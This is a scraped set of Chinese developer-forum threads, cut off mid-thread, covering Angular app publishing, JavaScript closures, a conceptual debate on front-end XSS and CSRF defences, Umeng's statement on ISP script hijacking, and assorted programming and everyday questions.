{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题, 本来准备边学边弄, 但没时间了. 想到论坛高手多, 只能求助各位, 诚心付费聘老师一名, 手把手教我把 Angular 程序,混淆加密后打包发布到 googleplay 和 apple store 谢 (目前 Angular 手机版已经调试成功) 有意者请留言私信 谢. 我的地点:上海长宁,可以到老师处上门求教.....</p>\n</div></div>"], "reply": "1", "tittle": "蒸大神一枚, 付费教我把 Angular 程序,加密后打包发布到 googleplay 和 apple store 谢......", "comment": ["-------------"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>####下面是我们的培养方案课程安排计划\n<img alt=\"mahua\" src=\"http://cdnlixian.oss-cn-beijing.aliyuncs.com/images/2-1.png\">\n<img alt=\"mahua\" src=\"http://cdnlixian.oss-cn-beijing.aliyuncs.com/images/2-2.png\">\n###一直搞不懂我们专业比较偏向于运维，而为什么要学习安卓系统开发和数据挖掘。以下是我给院长写的 4500 多字建议书，有耐心的 V 友麻烦能看一下，给出一点建议。只是想知道云计算专业究竟该学些什么\n<img alt=\"mahua\" src=\"http://cdnlixian.oss-cn-beijing.aliyuncs.com/images/1.png\">\n<img alt=\"mahua\" src=\"http://cdnlixian.oss-cn-beijing.aliyuncs.com/images/2.png\">\n<img alt=\"mahua\" src=\"http://cdnlixian.oss-cn-beijing.aliyuncs.com/images/3.png\">\n<img alt=\"mahua\" src=\"http://cdnlixian.oss-cn-beijing.aliyuncs.com/images/4.png\">\n<img alt=\"mahua\" src=\"http://cdnlixian.oss-cn-beijing.aliyuncs.com/images/5.png\">\n<img alt=\"mahua\" src=\"http://cdnlixian.oss-cn-beijing.aliyuncs.com/images/6.png\"></p>\n</div></div>"], "reply": "104", "tittle": "搞不懂我们云计算专业学安卓开发有毛用！给学校院长写了 4500 字建议有用吗？来看看，求给个建议。渣本实在没办法啊。", "comment": ["辛辛苦苦招个学生进来，结果 20 岁小伙子开始给 50 岁院长上课来了。", "这里讨论的问题看似简单，实际上可能就是我们整个计算机相关高等教育的现状：\r", "\r", "1. 多数高等教育并不是单纯以就业为目的安排教学方案；\r", "2. 正式工作内容几乎不可能完全贴合所学教育课程；\r", "3. 技术人员的价值往往在于解决问题和满足需求的能力，知识储备和基础能力只是服务于这一价值；\r", "4. 高等教育者对时下流行的知识和技能的掌握往往是严重滞后的；\r", "5. 高等教育无法实现个性化，难以发挥学生潜能；\r", "6. 对教育单位的教学水平的评估标准很难做到客观全面；\r", "7. 对学生各方素质的评估标准很难做到客观全面；", "大学大不了自己学，大学学到最重要的东西就是最重要的东西大学学不到", "懂个大概还是好的", "真正的槽点在于为什么是死的培养计划，我们都是必修+重点，重点是可以自己选的。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n  &lt;meta charset=\"UTF-8\"&gt;\n  &lt;title&gt;Document&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n  &lt;li&gt;1&lt;/li&gt;\n  &lt;li&gt;2&lt;/li&gt;\n  &lt;li&gt;3&lt;/li&gt;\n  &lt;script&gt;\n    var lis = document.getElementsByTagName('li');\n    for(var i=0; i&lt;lis.length; i++) {\n      (function(i) {//这里用闭包了吗？\n        lis[i].onclick = function(e) {\n          console.log(i);\n        }\n      })(i)\n    }\n\n    for(var i=0; i&lt;5; i++) {\n      (function() {\n        console.log(i)//输出 0,1,2,3,4\n      })()\n    }\n  &lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n</div></div>"], "reply": "22", "tittle": "对 js 的闭包还是很迷惑？第一个用闭包了吗？", "comment": ["用闭包的是 })(i) 那一行， function(i) 是函数声明，你写成 function(shit) 也是一样的", "r#1 @", " 错错错，被你绕晕了，})(i) 也不是闭包，你就是声明了一个函数再立刻调用了\r", "后面那个循环才是闭包", "不如试试 typescript ，就不用考虑闭包这些琐碎的事情了", "第一个注释那里不是闭包，用了传参，而下面的 onclick 那里用了，还有下面第二个也用了", "‘用’闭包这个说法不够清楚\r", "\r", "楼主给的例子应该是使用了闭包的，但不是闭包的典型用法，可参考\r", "\r", "\r", "\r", "说的很清楚了", "闭包就是捕获外部函数变量", "所以第二个 for 里面的函数，没有传参数，但是调用了外部的 for 里的 i ，这就是闭包。", "所谓闭包就是这样一种函数：\r", "广义上来说，如果一个函数有权访问到了其他函数作用域中的变量，那么就形成了闭包\r", "\r", "从这个意义上讲，诸如全局变量的访问，以及内嵌函数对外部函数的访问等等都是闭包\r", "甚至可以推广到任何函数都是闭包，因为都有对全局变量的访问权限， eg ：\r", "\r", "var a = 1\r", "var foo = function ( console.log(a) )\r", "foo() // 1  \r", "\r", "但事实上，由于这种访问是自发的天然的作用域链的延伸，所以通常我们并不把对全局变量的访问以及内层对外层的有权访问称之为闭包\r", "\r", "我们默认特指的闭包是这样的，比如下面代码：\r", "\r", "```javascript\r", "function wrapFoo() {\r", "    var wrapVar;\r", "    var inner = function() {\r", "        console.log(wrapVar)\r", "    }\r", "\r", "}\r", "```\r", "一个内嵌函数 inner ，具有对其外部函数 wrapFoo 所有变量的使用权，这里就是 warpVar ，如果这时在外部函数的再外层，这里就是全局环境中，实现了对内嵌函数 inner 的调用，这时就称 warpFoo 为闭包，另一个角度来说，外部函数的外面 [这里就是全局环境] ，本身是不能访问 wrapFoo 内部的变量的，通过某种方式 [如借助 return] 实现了对内嵌函数 inner 的调用，这就等于 inner 保存了 warpFoo 的变量，从而让全局中可以被访问到，这就是所谓的 close", "一般是说你打 log 那里访问了非本地又非全局的 i 算是用到了闭包的特性。", "从 js 的角度来说  如果了解 js 函数的作用域链+全局执行环境和函数执行环境\r", "就是能猜得出闭包\r", "其实是通过单独的`闭包活动对象`完成对其他`[[scop]]`的捕获\r", "从而达到扩展作用域的而实现的\r", "\r", "\r", "这些在 js 高教中讲得很清楚，建议去翻翻", "匿名函数就是一个闭包。但是一版说闭包是因为这个匿名函数里面引用了外部的变量，也叫自由变量 free variable 。而一般的函数只有参数有影响。比如: function fun(x){return x + y} ，这个函数的 x 是参数而 y 是自由变量，跟函数在定义的时候(而不是实现的时候)的上下文 (context) 的 y 有关的，这个也叫 static scope/lexical scope (与之相对的是 dynamic scope) 。\r", "js 里面 for(var i = 0; i < xxx.length; i++){} 这个循环里面的 i 的作用域不是在 for 里面，而是在 for 外面，所以循环里面有函数引用了这个 i 作为自由变量的时候，可以说使用了闭包。但是就楼主的例子，那个 i 只是作为参数，并不是自由变量，所以就是一般的函数调用。", "闭包最明显的特征：\r", "①函数嵌套定义\r", "②返回内层函数\r", "\r", "你两条都不符合。", "更需要关心的，是，为什么要用闭包？闭包能干啥？", "(function() {\r", "           //这是模仿其他语言的块级作用域，跟闭包没关系\r", "      })()\r", "闭包简单来说就是在一个函数内部声明一个函数，在内部函数引用外部函数的变量，就可以称为闭包了。\r", "\r", "一般还要在内部函数返回这个变量，不然这个闭包就没有意义了。", "have you try these:\r", "\r", "```\r", "for(var i=0; i<5; i++) {\r", "      setTimeout(function() {\r", "        console.log(i)\r", "      }, 0)\r", "}\r", "```\r", "\r", "```\r", "for(var i=0; i<5; i++) {\r", "      setTimeout(function(i) {\r", "        console.log(i)\r", "      }, 0, i)\r", "}\r", "```", "立即执行函数 ≠ 闭包\r", "\r", "闭包不需要你去实现，基本上你定义了一个函数，这个函数在存储状态中就会形成闭包， Chrome 的调试工具甚至可以让你看到函数的闭包里面包含了哪些东西", "闭包你可以理解为把一部分参数绑上去，得到一个新函数\r", "执行这个新函数就等效为执行原函数，带绑的参数", "“ In programming languages, closures (also lexical closures or function closures) are techniques for implementing lexically scoped name binding in languages with first-class functions.”\r", "\r", "-- ", "\r", "\r", "楼上所有的论断都太“主观感受”，不如从这个定义去仔细剖析。", "function(e) {\r", "          console.log(i);\r", "        }\r", " 这个是闭包\r", "(function() {\r", "        console.log(i)//输出 0,1,2,3,4\r", "      })()\r", "这个也是闭包", "其实闭包不重要，重要的是闭包的作用。\r", "\r", "闭包函数能把引用外层 function 的参数保留在内存，有一个独特的作用域，就是闭包，一般一层 function 调用全局变量不算，而 function 里面定义 function ，这里才会触发闭包。", "看自由变量"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>作为一名前端，感觉很多公司的前端安全非常脆弱。就这两年面试的公司来说，很多创业公司不注重前端安全。虽然 IE8 以上浏览器以及 Vue.js 这一类框架对 XSS 攻击做了一定的防范，但仍免不了无意或故意写出有漏洞的代码,随随便便把 cookie 给搞走。当然，很多公司的前端只用 jQuery 就不提了，很多前端流行：老夫拿起 jQuery 就是干。真想反问， jQuery 尤其是 jQuery 的早期版本没有做非常好的 XSS 防范，你真能时时刻刻考虑自己写的代码是否有 XSS 漏洞？<br></p>\n<p>不太了解后端，感觉大部分公司后端安全做的还可以， SQL 注入什么的感觉大家都挺注意的。只是有些疑问，为何前端安全那么脆弱。</p>\n</div></div>", "<div class=\"topic_content\">标题改成：国内某些互联网公司</div>"], "reply": "51", "tittle": "国内互联网公司，为何不注重前端安全", "comment": ["其实讲道理， xss 也该是后端防范的= =", "其实讲道理， xss 也该是前后端防范的= =，更何况还有 csrf ，点击劫持，造成的蠕虫，说明白了还是水平太差", "前端即使做了安全，后端还会继续做的。前端承担交互功能，做安全没什么实质性作用。", "不觉得安全和用什么框架，类库有关系", "不觉得安全和用什么框架，类库有关系 +1", "不觉得安全和用什么框架，类库有关系 +2", "先问是不是，再问为什么", "私以为是这只是不重视集成测试的诸多后果之一", "(只会用 API) 和 (对安全没概念) 可能有关联性。要保证安全也需要能深入研究。", " \r", " \r", " \r", "就 Vue 来说，若其它环节都没有做任何防范处理（当然这种可能非常小），\t第二种写法就存在 XSS 风险\r", "<span>Message: {{ msg }}</span>\r", "<span>Message: {{{ msg_html }}}</span>", "私以为是大部分公司不重视或者没有相关保障措施。安全是个很复杂的东西，不能光靠程序员自律，一来安全知识领域很深，普通程序员最多做到最基本的注意事项。二来受限于业务进展，顾不了那么多东西。如果公司没有安全部门，没做专门安全测试，光靠自律就能安全了？不可能的", "后端的职责，任何数据过来，都不该破坏或者影响其它正常数据，如 SQL 注入。\r", "前端的职责，后端返回的任何数据，展示时都自己做好转义，比如 XSS 。\r", "前后端一起合作完成的，例如 CSRF 。\r", "\r", "后端在 controller 里统一转义，或者清洗后再入库，都是中了 PHP Magic Quotes 的遗毒", "因为有价值观加成啊\r", "什么？你说这儿不安全？罚你五个月饼好了", " \r", " \r", " \r", " 嗯，普通程序员有安全概念就很难得了，考虑这么多是会影响业务开发进度，关键还是要有安全部门", " 从中秋到清明，这个梗还在。。。", " \r", "双大括号会将数据解释为纯文本，而非 HTML 。为了输出真正的 HTML ，你需要使用 v-html 指令：\r", "<div v-html=\"rawHtml\"></div>\r", "被插入的内容都会被当做 HTML —— 数据绑定会被忽略。注意，你不能使用 v-html 来复合局部模板，因为 Vue 不是基于字符串的模板引擎。组件更适合担任 UI 重用与复合的基本单元。\r", "你的站点上动态渲染的任意 HTML 可能会非常危险，因为它很容易导致 XSS 攻击。请只对可信内容使用 HTML 插值，绝不要对用户提供的内容插值。\r", "\r", "摘自 vue 文档", "360 网站监测 jQuery1.x 的最新版有 XSS 漏洞，能具体说说什么样的漏洞么，全世界那么多网站都在用的库，波及范围太广了吧", "xss 现在危害性也不是很高，只要后端返回 cookie 的时候把关键性的 cookie （比如 session id ）设置为 secure 就行了。其他的 xss 只能恶心恶心人", "钱没花到位或者压根不在乎，一般是亡羊补牢，没人搞我或者有人搞但是没出大乱子就不管。", "举一个不太适当的例子：创业公司花三千五招了个实习生搞前端还指望什么安全...", "没钱啊", " 哦，就是这个，忘记 Vue 文档已经说明了", " 不清楚，可惜乌云上不了了，之前有那么多的学习资源。。", "因为对挣钱没有一点用处，国内什么鸟风气，还不知道吗？金钱至上，当安全威胁到挣钱时候才会去搞得，比如大一点公司", "  搞笑了，不觉得安全和用什么框架，类库有关系 +1\r", "同时， Vue 文档苦口婆心的说了一万次谨慎使用 HTML 插值和 v-html 。竟然也拿出来成为 Vue 的黑点。\r", "现在这些人为了搞个大新闻真是什么损招都使得出啊。", "楼主千万别用原生 JS 了， document.innerHTML 危险更大更恐怖啊。。逃", "这种还算小的，我现在看我同学写的各种类似于毕业设计的小项目，各种越权漏洞（数据库查询的时候 where 只接收 url 带上的 id ，不带上 session 里面的 user id 做限制条件）还有下载漏洞（../../这种的）还有上传不校验扩展名的（直接上传一个 jsp 到你服务器上），现在我们还在学最基础的 jsp ，至于其他 xss ， csrf 的就更不用说了，从学校开始就有这种只看分数只看效果的思想，不重视隐含问题的习惯，只能靠以后职业生涯中的碰壁来修正吧。", " 不妨再加上 http-only ^_^", "楼主这标题扣的帽子太大了，你说国内某些互联网公司还差不多", "   对，就是 http-only", " ", "模板渲染里面的 escape 问题应该是比较基础的啊", "你用 jQuery 一样也会有这样的问题", "这和你用什么工具无关", " 我明明在正文里说 Vue 好，做了一定的防范，相比 jQuery 更能减少没有安全意识前端出漏洞的可能", "因为前端漏洞不如后端漏洞简单粗暴？", "前端作为一个“界”存在于业内也就七八年吧，哪儿有那么多经验流传下来啊……", "不要相信任何传过来的信息……这个是做后端最基本的原则……前端只是用来显示，不是写逻辑的", "前端还要担心安全的时候，说明后端没做好。", "跟库关系当然大拉。。。\r", "插个题，有人知道这句代码会导致什么安全问题吗？\r", "```javascript\r", "jQuery.get(location.pathname)\r", "```", "这个锅应该前端没什么好背的。", " 你说的是 xss 还是 csrf ？", "前端再怎么安全，都是要让后端重新来验证的，还不如放弃前端过滤", "前端 xss 的受害者一般是用户", "XSS 不是应该靠 Content Security Policy 就可以解决的吗", "不然网络专业就不会转行了", " \r", "1.安全人员难招,挂出去 JD.只收到了大量实习生简历。\r", "2.安全落地困难。上 http-only 要推一年.如果是上 CSP 简直是要他们命\r", "3.没有发生事情，程序员就认为是安全的", "我有一天闲来无事，用 react 试了下写点有 csrf 漏洞的代码，发现框架已经对 csrf 做了处理\r", "\r", "现在的浏览器和框架应该对这方面有处理\r", "\r", "私以为，前端安全怎么做也是一层纸，不过做还是要做的", "安全成本也算在成本里，一个治安良好的社区没必要家家装防盗窗", " 前端验证是防君子，后端验证是防小人", "这个根本还是得后端来做验证，前端只是辅助性的防范，真正想 attack 的完全可以直接绕过 js 验证，倒是觉得某些公司很少考虑后端需要做这些事情", "因为他们后端也没注意", " xxs 也是后端负责？", " #41 说解决太过了，只是缓解措施之一"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有一个内存地址 A ，这个地址偏移+0x10 的位置里存的是一个字符串的内存地址 B ，现在新建一个字符串并假设它的内存地址是 C ，把地址 A 存的内容由 B 改成 C ，在 objective c 里面不知道咋写，请教一下~</p>\n</div></div>"], "reply": "4", "tittle": "如何在 objc 里直接修改内存地址的数据？", "comment": ["照这个描述， a 存的不一定是 b 啊 233\r", "而且这里说的是让 a 存上地址 c 吧 233 ，否则听上去有点像拷贝一块内存。这里用 c 的部分就可以了", " \r", "那会类型转换搞错了，想做的就是下面这几个操作：\r", "int64_t A = (int64_t)structData;\r", "char * test = \"Test!!!\";\r", "*(int64_t *)(A + 0x20) = (int64_t)test;", "直接用 C 指针来操作就行了, OC 是 C 的严格超集, 所有 C 能用的技术都能在 OC 里用", "OC 里面最底层的貌似可以，但我认为你不如用 C ，直接操作指针。"]},
{"content": ["<div class=\"topic_content\">今天上去看，年份也不更新，所有 domain 也都断开了。</div>"], "reply": "8", "tittle": " 是不是已经死了？", "comment": ["被腾讯收购了", " 团队据说已经裁撤了\r", "目前只有 dnspod.cn", "药丸，我的动态 DNS 解析用的是他们家的服务", "dnspod.cn 一直有更新，应该还没挂", "....别说要挂...除了阿里云之外, dnspod 是我另外一个大批量使用的服务... 真挂了, 域名配置换起来麻烦的 1b 啊", "大量卖米的都在用它的免费版，如果要停估计会提前通知", "以前在用，还好早就迁移了。", " 会停止服务么"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>做一个类似 <a href=\"https://www.rust-lang.org/zh-CN/%E8%BF%99%E6%A0%B7%E7%9A%84%E8%BD%BB%E9%87%8F%E7%BA%A7\" rel=\"nofollow\">https://www.rust-lang.org/zh-CN/这样的轻量级</a> IDE ，能够通过 plugin 执行一种新语言 Souffle 。考察点：好不好用是关键， plug-in 之后编辑和编译起来方不方便，可不可行。有没有大神求赐教。</p>\n</div></div>"], "reply": "1", "tittle": "做一个类似 ", "comment": ["请独立完成作业"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://github.com/idf/snippyt\" rel=\"nofollow\">https://github.com/idf/snippyt</a></p>\n<pre><code>Usage:\n  snip &lt;snippet&gt;\n  snip &lt;snippet&gt; -c &lt;context&gt;\n\nExamples:\n  snip helloworld -c \"name=World;\"\n</code></pre>\n<p>样例</p>\n<pre><code>mkdir ~/.snippyt\necho \"{{ firstname }} {{ lastname }}'s own snippet\" &gt; ~/.snippyt/sample\nsnip sample -c \"firstname=John;lastname=Tenniel\"\n# John Tenniel's own snippet  \n\n</code></pre>\n<p>安裝</p>\n<pre><code>pip3 install snippyt\n</code></pre>\n<p>实现原理很简单，就是只想方便下大家的在命令行中 snippet 管理流程。</p>\n<p>欢迎 PR.</p>\n</div></div>"], "reply": "2", "tittle": "写了一个命令行的 snippet 管理工具", "comment": ["这个用于什么时候呢", " 比如一条 command 很长，但不是很经常用以至于不会做成 alias 。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>之前 fork 了一个别人的代码，后来源仓库关掉了，我这边也显示不了了。我如何把我自己账号里的这个仓库删掉了。\n现在点开直接显示如下内容：</p>\n<pre><code>Repository unavailable due to DMCA takedown.\n\nThis repository is currently disabled due to a DMCA takedown notice. We have disabled public access to the repository. The notice has been publicly posted.\n\nIf you are the repository owner, and you believe that your repository was disabled as a result of mistake or misidentification, you have the right to file a counter notice and have the repository reinstated. Our help articles provide more details on our DMCA takedown policy and how to file a counter notice. If you have any questions about the process or the risks in filing a counter notice, we suggest that you consult with a lawyer.\n</code></pre>\n</div></div>"], "reply": "9", "tittle": "github 如何删除 fork 别人的但是已经被人关掉的仓库", "comment": ["源删了， fork 的还在吧", "刚刚没看到 dmca ，这个没办法的，版权方要求 github 删的", " 嗯，是的。版方要求 github 删除的。 我如何能把我这边的 repository 删掉吗", " github 能直接联系官方的，你在网页找一下让他们帮忙删掉就可以了", "邮件联系，可以删", " ", " 这个吗？", "忘了哪儿看的了，据说可以通过 API 删", "发给官方发邮件可以，删的很快...", " 嗯，已经发了。 给我会了一封确认邮件。速度确实挺快的"]},
{"content": ["<div class=\"topic_content\">太久没写 js 了 我简写下程序大概是这样的\r<br>var age = 9\r<br>if(0&lt;=age&lt;=10){\r<br>     return true;\r<br>}else{\r<br>     return false;\r<br>}\r<br>我走了无数遍都是 false 打印 if(0&lt;=age&lt;=10) 也是 false 看了好久才发现是我的写法不对：）</div>"], "reply": "1", "tittle": "哈哈哈哈哈 今天居然被一个弱智问题困扰了 10 多分钟", "comment": ["你以为是 python 捏....."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>讲个笑话:</p>\n<p>&lt;img class=\"png\"</p>\n</div></div>"], "reply": "35", "tittle": "今天修改前人留下的项目 真的好想骂人啊", "comment": ["有个 class 算不错的啦", "笑点在哪里？", ".png { }多直观", "没问题啊\r", "\r", "楼主没兼容过 Ie 6 吧\r", "\r", "有这样的类也很正常", "没看懂问题出在哪里.....不能用 png 当类名？", "复制页面用但是函数名称也不换一下（用在其他模块）\r", "\r", "人事资料页面顶着一个搜索产品的函数名 = =。\r", "（虽然用是没问题）", "我也不知道吐槽 png 的点在哪里，平时用 img 做类名还不是写的稳。", "该骂人的不应该是今天", "还用上班嘛？", "不是自己的项目都有洁癖", "这个 class 有啥问题？", "楼主你见过用拼音还拼错的吗？体育老师看了都想打人", "<img class=\"tu-pian\"/>", "前两天接手的说是加个功能，然而我现在却在 redo 最核心的那一大块代码......", "哈哈，还好啦，楼主别太“完美主义”哦。", " 关键是 他没有还写 png 这个类", " 哎 英语单词拼写错误很烦人的 有时他居然又写对了。。。", "\r", "刚接到坑的我是崩溃的, 改了一个星期后实在改不动弃坑跑路了", " 哈哈哈  盆友", " 喷油？", "至少是驼峰的。", "zuji ：足迹\r", "MingPian ：名片\r", "PenYou ：应该是朋友的误写，盆友\r", "ShiGuang ：时光\r", "FootFriend ：足友\r", "——实在编不下去了………………", " “足友”，味道扑面而来，哈哈哈", "果然还是我太菜了\r", "<img src=\"http://i2.muimg.com/4851/8ccd6cf469e41815.jpg\">", " 不容易啊 2333", " 没事，我也跑路了", "感觉提到的也不是什么严重问题呀，就是类名命名奇葩，类名和业务不符合，熟悉一下就知道个大概了，至少对方也是有意识的要写好，。如果是代码逻辑混乱，改一处 bug 冒出无数个 bug ，那才叫崩溃呢", " 是足记那个 app ？", "改 app 能改到跑路，只能说明自己菜！下一题", "实际上类名函数名什么的真心不必要一定要用英文，", "事实上还有更可怕的测试代码乱飞，分层混乱，大量过时代码，底层吞异常", "html css 根本谈不上什么规范,试问在座的维护代码不是对着调试器来改？谁管你命名如何", "笔友....", "你这个还好了，我接过一个项目，动不动四五百行莫名其妙的代码……", "ie6 的即视感", " 卧槽，我最近入了一个坑，一个 JS 里面有三种命名方式，后台代码变量名有一个字母的，然后昨天在 html 里面看到把 ID 当作 Class 来用的，简直了。。。"]},
{"content": ["<div class=\"topic_content\">近期我们收到部分用户反馈，部署了网站统计的代码会“出现广告弹窗”及“浏览器提示不安全警告”的问题。\r<br>\r<br> [友盟+] 针对该情况进行了紧急技术排查，发现部分网络运营商在从中捣鬼！为了保证统计用户体验稳定，请您参照如下方案对网站安全策略进行升级，避免流量被不法分子劫持。\r<br>\r<br> [友盟+] 在此郑重声明：出现的违规弹窗广告及浏览器不安全警告，绝不是 [友盟+]  U-Web 网站统计所为。对于别有用心人士的子虚乌有、以讹传讹行径以及对 [友盟+] 声誉带来的不良影响，我们将通过法律途径解决！\r<br>\r<br><a target=\"_blank\" href=\"/i/80y602Jrl.png\" title=\"在新窗口打开图片 80y602Jrl.png\"><img src=\"//i.v2ex.co/80y602Jrl.png\" class=\"embedded_image\"></a>\r<br>\r<br>\r<br>弹窗及浏览器提示不安全警告解决方案\r<br>\r<br>一、\t运营商劫持\r<br>\r<br>部分不良运营商直接在路由交换层面解析 cnzz 的 http 报文，然后加入非法（广告，色情，赌博）代码链接，在这个宽带运营商覆盖的范围下面，所有的用户都会受到影响。\r<br>\r<br>解决方案：请遇到此问题的用户务必登录统计后台 <a target=\"_blank\" href=\"http://www.umeng.com\" rel=\"nofollow\">www.umeng.com</a> 选择 U-Web 统计产品，并获取 https 代码替换 http 网站代码。\r<br>\r<br>二、\tDNS 劫持\r<br>部分不良运营商通过修改 dns 解析，让 <a target=\"_blank\" href=\"http://c.cnzz.com\" rel=\"nofollow\">c.cnzz.com</a> 域名解析到一个非法的站点，最终使最终客户下载到 js 代码完全是被篡改的 js 代码，导致用户浏览器打开网页时被指向到各种非法（广告，色情，赌博）链接上。\r<br>\r<br>解决方案：如已更换 https 代码，依旧出现弹窗，请提供以下证据；\r<br>\r<br>提供最终客户在电脑中执行 nslookup 命令，将解析到的 dns 信息以及使用者的所属运营商信息截图给我们，以方便后续跟踪处理。\r<br>\r<br>我们会根据您提供的相关证据，反馈到工信部相应的部门。解决垃圾广告弹窗、打造干净行业生态，是我们共同的目标。</div>"], "reply": "38", "tittle": "[友盟+] 声明：坚决抵制网络劫持行为！", "comment": ["把 HTTPS 作为默认代码\r", "\r", "HTTP 代码放到下面， 也就是和现在的格局对调会更适宜目前的行业", "顺便抵制一下嵌入 SDK 的 APP 一启动就把 XX 系全部启动起来吧", "不要这么给运营商面子，你不好意思点名我来点名：上海电信\r", "\r", "狗曰的挖空心思耍流氓赚黑心钱，网络劫持，限制国外流量，不遗余力推广自己的氮气瓶，把用户这条砧板上的鱼一鱼 n 吃。", "应该用 HSTS 吧", " 我也来点名厦门电信和厦门移动", "部分不良运营商直接在路由交换层面解析 cnzz 的 http 报文，，然后加入非法（广告，色情，赌博）代码链接\r", "\r", "那么问题来了\r", "\r", "我国运营商干这种事不是一天两天了 \r", "为什么还没有被查封？ \r", "为什么快播就死了呢？\r", "为什么赌博犯法呢？\r", "\r", "\r", "（ xx 运营商董事长部分信息）闲扯淡搜了下\r", "尚先生曾先后担任\r", "辽宁省工业技术开发中心主任，\r", "辽宁省经济技术开发总公司总经理，\r", "中国联合通信有限公司辽宁省分公司总经理，\r", "中国联合通信有限公司董事、副总经理、总经理，\r", "中国联合通信股份有限公司、\r", "中国联通股份有限公司执行董事、总裁，\r", "中国电信集团公司副总经理，\r", "中国电信股份有限公司执行董事、总裁、首席运营官\r", "中国工业和信息化部副部长等职务。", "支持为民除害", "是该搞事情了", "辽宁联通家庭宽带和 4G 网络都有劫持，网页下部插入悬浮广告，还经常跳转笑断腰", "没几个运营商不劫持的，为什么他们这么气焰嚣张", "hsts", "这么搞没用\r", "\r", "这种事情只能靠立法+执行", "HTTPS +1", "感觉中移动高层这几年是关进去好几个了…", "不说, 请部署好 https 吧", "已经 HTTPS 了的话，运营商也改不了吧", " 如果通用的浏览器客户端能够解析，为啥运行商不能改？大不了下发到终端用户手里的时候，换个证书，反正小白用户也不懂什么证书，他只知道页面上有广告", " 我倒是很期待运营商玩 MITM 被曝光后工信部会有什么反应.", " 还好我在 wh", "还好我已屏蔽阿里全系追踪域名 cnzz 友盟 ", " ", " 等等.", " 以前用过武汉移动一条不要钱的 100M 对等，上知名的购物网站大概每半小时就会被强制跳转 3 次 yiqifa", "支持为民除害！", "支持为民除害！对于敢于赚黑心钱的黑心运营商就要监督抵制！", "随着 FCC rules 的 rollback ，大洋彼岸美帝 ISP 们的这种做法已经被合法化了。。", " 怎么换证书？使用非法证书的话浏览器会拒绝加载的吧", "我记得你们 s95 以前是被入侵了吧\r", "用了 https 一样被劫持。并且还检查网址选择性劫持。", " 运营商自己的证书啊，想搞个合法证书还不容易", " 你的意思是說，類似「中國電信搞到 GitHub 的合法證書」這種？如何搞？", " 不是啊，中国电信就用中国电信自己的合法证书啊，像我们懂这行的知道 github 应该是 github 的证书，不应该是中国电信的证书，但是这世上小白更多啊，就算浏览器上有提示证书的功能，但是小白看到中国电信的证书也还是很信任的，而且更多的人可能都不知道什么是证书", " 会显示证书错误完全拒绝加载，中国电信的证书只能用在中国电信的域名上，证书和域名是绑定的\r", "\r", "一样是拒绝加载，由权威 CA 颁发的中国电信域名的证书 和 自签证书，有何区别？", "使用 HTTPS 理论上不会让 DNS 劫持生效\r", "假服务器上没有由权威 CA 颁发的 CNZZ 的证书，因此会拒绝加载\r", "自签，拒绝加载\r", "域名不符，拒绝加载", "\r", "\r", "HTTPS HSTS HPKP CSP 楼主你需要这个", "  \r", "请套上 condom 保平安 \r", "前不久我的博客站( ", " https 了，发现页面半天加载不完，绿标也不出现，经调试发现有是有些链接如 cnzz 的统计代码，友言评论框不是 https 的，后来全换了就好了。", " 上面的链接有误， ", " 杭州联通也没好到哪儿去，每个页面下面都是他们的商业广告", " 正如 @", " 所說，除非用戶使用的是很久以前的瀏覽器，否則應該是很難不注意到這個問題的。如果這都強行無視的話這種用戶你無法顧及的，人家一輩子用 IE6 ，一輩子用 Windows XP ，天天上黃網下小電影還不裝殺毒軟件，就跟釘子戶一樣；建議還是跟項目經理說明一下，不要服務這種用戶。吃力不討好，牛皮糖的錢不好掙。去服務大部分有起碼安全意識的人吧。"]},
{"content": ["<div class=\"topic_content\">一般设计个普通企业 PC 网站的首页现在是什么价位了啊？仅设计，不需要切图跟前端</div>"], "reply": "8", "tittle": "这里能找到做网页美工的吗？", "comment": ["同问", "去站酷找啊....", "我是做 Ui 的，给个联系方式我加你啊", " 看看上面的设计吧", " 你可以联系 @", " ，不错的", "想省钱？找个模板改吧改吧", " 哇撒 也是山西的", " 嗯嗯"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>中午做饭时室友（女的）说 1500 块现金、一副耳钉（材质不详）没了，被偷了。。其他电脑啥的没动，房间内也未发现被翻动的痕迹，被偷时间大概在一个月内。</p>\n<p>我们租的两居室，我房间桌子上有 rmbp  iPad  ps4  DELL 的 2K 显示器 filco 键盘  kindle PS4 游戏光碟之类电子产品  抽屉里还有几十块钱都没动  快一年的时间里我上班、放假回家期间卧室门从没锁过 甚至都没关过  一直也没事。</p>\n<p>所以。。这个贼是嫌弃我的东西不够好么 还是。。。我现在很同情她又很同情我自己。。</p>\n</div></div>", "<div class=\"topic_content\">JC 叔叔都来了 她肯定当真了</div>", "<div class=\"topic_content\">好吧，有啥好用的摄像头可以推荐的么？掩面哭！</div>", "<div class=\"topic_content\">在派出所 刚被警察叔叔谈心 唉！又刷了个人生第一次的成就。。</div>", "<div class=\"topic_content\">JC 叔叔说依据他的经验，真是高层入室盗窃不可能这么仁慈的，除了我的东西外，她桌子上还有苹果本一台 华硕笔记本一台 相机一台 都没动。。 所以不认为是案件  并告诉我们一般盗窃案限于各种因素很难追回 还是以预防为主 我们表示理解并签字画押按手印回来了。。 p.s JC 叔叔拿我身份证看下说咦我们老乡呢 临走时对妹子说要相信我们 XX 地方的人都是很好滴 当然都是题外话了。。 回来妹子又开始翻箱倒柜并喊我看这个脚印那个手印的 我以不感兴趣为由拒绝了 嗯 她买的摄像头已经在路上了。。</div>"], "reply": "107", "tittle": "室友遭窃，需不需要自证清白？", "comment": ["报警就行", "合租麻烦事就是多", "都这年代了，干嘛搞那么多现金放合租屋里啊，难道没有银行卡、支付宝和微信支付吗？", "樓主是來炫富的 鑑定完畢", "设计把你挤兑走，换个帅气新室友。", 